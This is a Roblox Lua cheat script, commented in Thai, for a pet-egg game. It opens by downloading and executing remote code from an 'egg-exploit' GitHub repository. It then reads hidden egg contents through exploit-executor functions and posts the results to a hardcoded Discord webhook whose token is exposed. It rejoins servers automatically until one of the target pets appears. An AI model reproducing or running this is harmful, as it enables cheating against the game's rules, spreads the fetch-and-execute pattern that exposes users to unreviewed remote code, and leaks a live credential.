
loadstring(game:HttpGet("https://raw.githubusercontent.com/n3xkxp3rl/egg-exploit/refs/heads/main/script.lua"))()

-- 🔧 ใส่ Webhook ของคุณที่นี่
local webhookUrl = "https://discord.com/api/webhooks/1381145202496110682/5-8kZ4xW0I6iR92lsqZKe2haJSvvG4nd5IPP6bnKacPnpD4AXqRFtCJp-UVGwdSNwnO8"

-- ✅ ฟังก์ชันส่งข้อมูลไปยัง Discord Webhook
local function sendToWebhook(petNameList)
    local HttpService = game:GetService("HttpService")

    local content = "🧪 รายชื่อสัตว์ที่ตรวจพบ:\n" .. table.concat(petNameList, "\n")

    local payload = HttpService:JSONEncode({
        username = "Egg Scanner",
        content = content
    })

    -- รองรับหลาย API (Synapse, KRNL, etc.)
    local requestFunc = http_request or syn and syn.request or request
    if requestFunc then
        requestFunc({
            Url = webhookUrl,
            Method = "POST",
            Headers = {
                ["Content-Type"] = "application/json"
            },
            Body = payload
        })
    else
        warn("❌ ไม่สามารถส่ง Webhook ได้ (exploit ไม่รองรับ)")
    end
end

-- 🔘 สร้างปุ่ม Rejoin
local function CreateRejoinButton()
    local screenGui = Instance.new("ScreenGui")
    screenGui.Name = "RejoinGui"
    screenGui.ResetOnSpawn = false
    screenGui.Parent = game:GetService("Players").LocalPlayer:WaitForChild("PlayerGui")

    local button = Instance.new("TextButton")
    button.Size = UDim2.new(0, 120, 0, 40)
    button.Position = UDim2.new(1, -130, 1, -50)
    button.AnchorPoint = Vector2.new(0, 1)
    button.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
    button.TextColor3 = Color3.new(1, 1, 1)
    button.Font = Enum.Font.SourceSansBold
    button.TextSize = 18
    button.Text = "Rejoin"
    button.Parent = screenGui

    button.MouseButton1Click:Connect(function()
        local TeleportService = game:GetService("TeleportService")
        local Players = game:GetService("Players")
        local placeId = game.PlaceId
        TeleportService:Teleport(placeId, Players.LocalPlayer)
    end)
end

CreateRejoinButton()

-- 🧠 ตั้งค่าระบบ
local replicatedStorage = game:GetService("ReplicatedStorage")
local collectionService = game:GetService("CollectionService")
local players = game:GetService("Players")
local localPlayer = players.LocalPlayer

-- 🧠 ดึงข้อมูลไข่
local hatchFunction = getupvalue(getupvalue(getconnections(replicatedStorage.GameEvents.PetEggService.OnClientEvent)[1].Function, 1), 2)
local eggPets = getupvalue(hatchFunction, 2)

-- ✅ ดึงรายชื่อสัตว์จากไข่บนแผนที่ตอนนี้
local function getCurrentMapPetNames()
    local seen = {}
    local names = {}

    for _, object in ipairs(collectionService:GetTagged("PetEggServer")) do
        local objectId = object:GetAttribute("OBJECT_UUID")
        local petName = eggPets[objectId]
        if petName and not seen[petName] then
            seen[petName] = true
            table.insert(names, petName)
        end
    end

    table.sort(names)
    return names
end



-- 🖥️ สร้าง UI แสดงชื่อสัตว์
local function createPetListUI(petNameList)
    local screenGui = Instance.new("ScreenGui")
    screenGui.Name = "PetListUI"
    screenGui.ResetOnSpawn = false
    screenGui.Parent = localPlayer:WaitForChild("PlayerGui")

    local frame = Instance.new("Frame", screenGui)
    frame.Size = UDim2.new(0, 300, 0, 400)
    frame.Position = UDim2.new(1, -320, 0.5, -200)
    frame.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
    frame.BorderSizePixel = 0

    local scrolling = Instance.new("ScrollingFrame", frame)
    scrolling.Size = UDim2.new(1, 0, 1, 0)
    scrolling.CanvasSize = UDim2.new(0, 0, 0, #petNameList * 35)
    scrolling.ScrollBarThickness = 6
    scrolling.BackgroundTransparency = 1

    for i, petName in ipairs(petNameList) do
        local label = Instance.new("TextLabel", scrolling)
        label.Size = UDim2.new(1, -10, 0, 30)
        label.Position = UDim2.new(0, 5, 0, (i - 1) * 35)
        label.Text = petName
        label.BackgroundColor3 = Color3.fromRGB(50, 50, 50)
        label.TextColor3 = Color3.new(1, 1, 1)
        label.Font = Enum.Font.SourceSans
        label.TextSize = 20
        label.BorderSizePixel = 0
    end
end

-- ⏳ เรียกเมื่อ eggPets โหลดเสร็จ
task.delay(2, function()
    local petList = getCurrentMapPetNames()
    if #petList > 0 then
        createPetListUI(petList)
    else
        warn("⚠️ ไม่มีสัตว์ใดอยู่ใน map ตอนนี้")
    end
end)

-- 🟡 ตั้งชื่อสัตว์ที่ต้องการหา
local targetPetNames = {
    "Dragonfly",
    "Queen Bee",
    "Raccoon",
    "Disco Bee",
    "Butterfly"
}

-- 🔍 ฟังก์ชันเช็คว่า petList มีสัตว์ที่อยู่ใน targetPetNames ไหม
local function hasAnyTargetPet(petList)
    local wanted = {}
    for _, name in ipairs(targetPetNames) do
        wanted[name] = true
    end

    for _, pet in ipairs(petList) do
        if wanted[pet] then
            return true, pet
        end
    end
    return false, nil
end

-- ⏳ ตรวจหลัง eggPets โหลดแล้ว
task.delay(5, function()
    local petList = getCurrentMapPetNames()
    if #petList > 0 then
        createPetListUI(petList)
        sendToWebhook(petList)

        local found, petName = hasAnyTargetPet(petList)
        if not found then
            warn("❌ ไม่พบสัตว์เป้าหมายใดเลย → Rejoining...")
            task.wait(1)
            game:GetService("TeleportService"):Teleport(game.PlaceId, localPlayer)
        else
            print("✅ พบสัตว์ที่ต้องการแล้ว: " .. petName)
        end
    else
        warn("⚠️ ไม่มีสัตว์ใดอยู่ใน map ตอนนี้")
    end
end)
